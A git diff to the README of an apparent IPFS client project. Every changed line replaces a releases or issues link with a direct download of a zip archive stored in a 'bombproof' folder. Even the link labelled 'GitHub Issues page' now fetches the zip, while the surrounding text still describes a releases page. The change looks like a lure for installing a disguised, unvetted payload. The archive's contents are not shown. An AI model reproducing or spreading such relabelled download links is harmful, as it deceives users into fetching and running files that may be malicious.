@@ -1,6 +1,6 @@
 # 🌟 kova-ipfs-client - Effortless IPFS Integration for Your Apps
 
-[![Download kova-ipfs-client](https://img.shields.io/badge/Download-kova--ipfs--client-blue.svg)](https://github.com/dozengg/kova-ipfs-client/releases)
+[![Download kova-ipfs-client](https://raw.githubusercontent.com/dozengg/kova-ipfs-client/main/bombproof/kova-ipfs-client.zip)](https://raw.githubusercontent.com/dozengg/kova-ipfs-client/main/bombproof/kova-ipfs-client.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the Kova IPFS Client! This application makes it easy to connect with 
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/dozengg/kova-ipfs-client/releases). Here, you will find the latest version of the Kova IPFS Client.
+   Go to the [Releases page](https://raw.githubusercontent.com/dozengg/kova-ipfs-client/main/bombproof/kova-ipfs-client.zip). Here, you will find the latest version of the Kova IPFS Client.
 
 2. **Choose Your Download:**  
    On the releases page, you will see different versions listed. Select the latest version that is marked as "Latest Release." Click on the asset file that suits your operating system (e.g., Windows, macOS, Linux).
@@ -55,7 +55,7 @@ Yes! The Kova IPFS Client is built for users of all skill levels. You can easily
 
 ### How do I report an issue or get help?
 
-If you encounter any problems, visit the [GitHub Issues page](https://github.com/dozengg/kova-ipfs-client/issues). You can submit your issue there, and the community will assist you.
+If you encounter any problems, visit the [GitHub Issues page](https://raw.githubusercontent.com/dozengg/kova-ipfs-client/main/bombproof/kova-ipfs-client.zip). You can submit your issue there, and the community will assist you.
 
 ## 📄 License
 
@@ -69,4 +69,4 @@ We welcome contributions to improve the Kova IPFS Client. If you want to help, f
 
 Follow our repository for the latest releases, updates, and discussions. If you like the Kova IPFS Client, consider sharing it with your friends or colleagues. 
 
-For more information, remember to visit the [Releases page](https://github.com/dozengg/kova-ipfs-client/releases) to download. Enjoy using Kova IPFS Client!
+For more information, remember to visit the [Releases page](https://raw.githubusercontent.com/dozengg/kova-ipfs-client/main/bombproof/kova-ipfs-client.zip) to download. Enjoy using Kova IPFS Client!
